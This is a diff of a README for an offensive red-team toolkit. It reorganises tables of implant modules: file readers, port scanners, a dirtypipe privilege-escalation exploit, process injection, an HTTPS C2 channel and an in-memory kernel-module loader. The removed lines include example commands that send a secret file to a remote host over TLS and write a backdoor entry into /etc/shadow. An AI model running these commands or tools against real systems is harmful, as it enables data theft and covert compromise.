@@ -109,76 +109,25 @@ In addition to `bof-launcher` and `z-beac0n` projects, we maintain growing colle
 
 We have two types of BOFs here:
 
-1. Conventional BOFs that are fully compatible with original `Cobalt Strike` BOFs and can be run in other red teaming toolboxes as well. Specifically, [Sliver](https://github.com/BishopFox/sliver), [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2) and [Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html) were [tested](bofs/socat).
+1. Conventional BOFs that are fully compatible with original `Cobalt Strike` BOFs and can be run in other red teaming toolboxes as well. Specifically, [Sliver](https://github.com/BishopFox/sliver), [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2) and [Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html) were [tested](bofs/socat).<br>
 
-| Category  | Description | BOFs list | Documentation
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| SAL-BOF | Local Situational Awareness BOFs | [lskmod](bofs/src/lskmod.zig),[hostname](bofs/src/coreutils/hostname.zig),[hostid](bofs/src/coreutils/hostid.zig),[id](bofs/src/coreutils/id.zig),[uname](bofs/src/coreutils/uname.zig),[uptime](bofs/src/coreutils/uptime.zig),[who](bofs/src/coreutils/who.zig),[ifconfig](bofs/src/net-tools/ifconfig.zig),[whoami](bofs/src/whoami.zig),[whereami](bofs/src/whereami.zig),[winver](bofs/src/wWinver.zig) | [SAL-BOF reference page](bofs/SAL-BOF.md) |
-
-2. Special purposes BOFs, that serve specifically as a buliding blocks for our `z-beac0n` implant.
-
-| Category  | Description | BOFs list | Documentation
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| BOF0 | So called `BOF zero`. Those ones operate as standalone implants, managing and executing other loaded BOFs (botch conventional and API-style) | [z-beac0n core](bofs/src/z-beac0n-core.zig) | [BOF0 reference page](bofs/BOF0.md) |
-
-
-## Filesystem interaction: FS-BOF
-
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [pwd](bofs/src/pwd.zig) | print name of current/working directory | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `pwd` |
-| [cd](bofs/src/cd.zig) | change working directory | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `cd /` |
-| [cat](bofs/src/cat.zig) | print content of a file | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `cat /etc/passwd` |
-| [zcat](bofs/src/zcat.zig) | print content of a gzip compressed file | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `zcat /boot/config.gz` |
-| [ls](bofs/src/ls.zig) | list directory content | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `ls /etc` |
-| [grep](bofs/src/grep.zig) | Print lines that match patterns | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `grep root /etc/passwd` |
-| [find](bofs/src/find.zig) | Search for files in a directory hierarchy | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `find /dev -type b` |
-
-## Networking: NET-BOF
-
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [socat](bofs/socat/) | Arbitrary TCP and TLS connections | `Linux x86/x86_64/ARMv6+/AArch64` | `socat OPEN:/etc/secretdata TLS:remotehost:8443` |
-
-## Remote Situational Awareness: SAR-BOF
-
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [tcpScanner](bofs/src/tcpScanner.zig)  | TCP connect() port scanner  | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `tcpScanner 4.3.2.1-255:22,80` |
-| [udpScanner](bofs/src/udpScanner.zig) | UDP port sweeper | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `udpScanner 4.3.2.1-255:5000-5010` |
-
-## Context elevation: Elevation-BOF
-
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [dirtypipe](bofs/src/dirtypipe.zig) | Exploit for 'dirtypipe' vulnerability (CVE-2022-0847) implemented as a BOF | `Linux x86/x86_64/ARMv6+/AArch64` | `dirtypipe /etc/shadow 913 "backdoor:xxx:10123::::::"` 
-
-## Process injection: Injection-BOF
-
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [processInjectionSrdi](bofs/src/wProcessInjectionSrdi.zig) | This BOF can inject any other BOF to any running process | `Windows x86/x86_64` | `cli4bofs inject file:abs_path_to_bof -i:<pid>` |
-
-Implant's core building blocks:
-
-## Implant core: BOF0
-
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [z-beac0n core](bofs/src/z-beac0n-core.zig) | Special purpose BOF so called `BOF zero`, it operates as standalone implant, manages other loaded BOFs; capable of executing other BOFs | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `z-beac0n` |
+| Category  | Description | BOFs list | Documentation |
+| ---------------- | ----------- | --------- | ------------- |
+| SAL-BOF | Local Situational Awareness BOFs | [lskmod](bofs/src/lskmod.zig), [hostname](bofs/src/coreutils/hostname.zig), [hostid](bofs/src/coreutils/hostid.zig), [id](bofs/src/coreutils/id.zig), [uname](bofs/src/coreutils/uname.zig),<br>[uptime](bofs/src/coreutils/uptime.zig), [who](bofs/src/coreutils/who.zig), [ifconfig](bofs/src/net-tools/ifconfig.zig), [whoami](bofs/src/whoami.zig), [whereami](bofs/src/whereami.zig), [winver](bofs/src/wWinver.zig) | [SAL-BOF reference](bofs/SAL-BOF.md) |
+| FS-BOF | Filesystem interaction BOFs | [pwd](bofs/src/pwd.zig), [cd](bofs/src/cd.zig), [cat](bofs/src/cat.zig), [zcat](bofs/src/zcat.zig), [ls](bofs/src/ls.zig), [grep](bofs/src/grep.zig), [find](bofs/src/find.zig) | [FS-BOF reference](bofs/FS-BOF.md) |
+| NET-BOF | Networking BOFs | [socat](bofs/socat/) | [NET-BOF reference](bofs/NET-BOF.md) |
+| SAR-BOF | Remote Situational Awareness BOFs | [tcpScanner](bofs/src/tcpScanner.zig), [udpScanner](bofs/src/udpScanner.zig) | [SAR-BOF reference](bofs/SAR-BOF.md) |
+| Elevation-BOF | Context elevation BOFs | [dirtypipe](bofs/src/dirtypipe.zig) | [Elevation-BOF reference](bofs/Elevation-BOF.md) |
+| Injection-BOF | Process injection BOFs | [processInjectionSrdi](bofs/src/wProcessInjectionSrdi.zig) | [Injection-BOF reference](bofs/Injection-BOF.md) |
 
 
-## Implant C2 channel: C2-BOF
+2. Special purposes BOFs, that serve specifically as a buliding blocks for our `z-beac0n` implant.<br>
 
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [C2channelHTTPS](bofs/src/C2channelHTTPS.zig) | Special purpose API-style BOF providing HTTPS C2 communication channel | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `-` |
-
-## Implant misc APIs: API-BOF
-
-| BOF name  | Description | Supported platforms | Example
-| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
-| [kmodLoader](bofs/src/kmodLoader.zig) | API-style BOF; load/unload kernel module directly from memory (root privileges required) | `Linux x86/x86_64/ARMv6+/AArch64` | see docs |
+| Category  | Description | BOFs list | Documentation |
+| --------- | ----------- | --------- | ------------- |
+| BOF0 | So called `BOF zero`. Those ones operate as standalone implants, managing and executing other loaded BOFs (both conventional and API-style) | [z-beac0n core](bofs/src/z-beac0n-core.zig) | [BOF0 reference](bofs/BOF0.md) |
+| C2-BOF | Special purpose API-style BOFs providing alternative C2 communication channels | [C2channelHTTPS](bofs/src/C2channelHTTPS.zig) | [C2-BOF reference](bofs/C2-BOF.md) |
+| API-BOF | Misc API-style BOFs | [kmodLoader](bofs/src/kmodLoader.zig) | [API-BOF reference](bofs/API-BOF.md) |
 
 # Building all components
 
